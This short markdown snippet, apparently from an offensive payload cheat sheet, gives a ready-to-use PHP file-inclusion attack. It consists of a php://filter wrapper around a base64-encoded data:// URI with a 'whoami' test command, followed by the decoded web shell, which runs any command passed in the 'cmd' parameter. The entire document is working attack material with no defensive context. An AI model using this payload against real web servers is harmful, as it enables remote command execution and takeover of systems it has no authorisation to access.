# PHP Wrapper Encoded Webshell

### Command:

    php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami

####  The encoded payload is: 

    <?php system($_GET['cmd']); echo 'Shell done!'; ?>
